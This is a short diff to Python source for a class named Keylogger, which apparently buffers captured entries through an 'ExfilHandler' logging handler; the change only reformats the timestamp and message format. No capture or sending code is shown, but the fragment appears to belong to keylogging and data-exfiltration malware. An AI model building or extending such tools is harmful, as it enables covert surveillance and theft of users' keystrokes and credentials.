@@ -52,13 +52,15 @@ class ExfilHandler(logging.handlers.MemoryHandler):
 class Keylogger(object):
 
     BUFFER_SIZE = 100
-    DEFAULT_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+    BASE_FORMAT = '%(asctime)s %(message)s'
+    DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
 
     def __init__(self, logger=None):
         self.logger = logger or logging.getLogger(__name__)
         self.logger.setLevel(logging.INFO)
         stream_handler = logging.StreamHandler(StringIO())
-        formatter = logging.Formatter(self.DEFAULT_FORMAT)
+        formatter = logging.Formatter(
+            fmt=self.BASE_FORMAT, datefmt=self.DATE_FORMAT)
         stream_handler.setFormatter(formatter)
         self.exfil_handler = ExfilHandler(
             capacity=self.BUFFER_SIZE, target=stream_handler)
